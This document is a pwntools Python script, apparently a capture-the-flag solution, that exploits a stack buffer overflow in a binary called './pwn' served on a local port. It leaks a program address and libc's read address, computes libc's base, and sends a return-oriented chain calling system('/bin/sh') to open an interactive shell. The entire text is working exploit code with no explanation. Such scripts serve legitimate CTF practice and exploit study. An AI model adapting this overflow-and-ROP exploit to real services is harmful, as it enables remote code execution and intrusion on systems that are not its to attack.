from pwn import *

context(arch='amd64', os='linux')
#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')
LOCAL = False
if LOCAL:
    p = process('./pwn')
else:
    p = remote('127.0.0.1', 43659)

def exploit():
    p.recvuntil(b'use ')
    elf_read = int(p.recv(14),16)
    elf_base = elf_read - 0x1060
    log.success(f'elf_base: {hex(elf_base)}')
    payload = b'a' * 0x20 + p64(elf_base + 0x4300) + p64(elf_base + 0x11da)
    p.send(payload)

    p.recvuntil(b'How can I use ')
    read_got = int(p.recv(14),16)
    log.success(f'read_got: {hex(read_got)}')
    libc_base = read_got - 0x1147d0
    log.success(f'libc_base: {hex(libc_base)}')
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    ret = libc_base + 0x29139
    rdi = libc_base + 0x2a3e5
    
    payload = b'a' * 0x28 + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    exploit()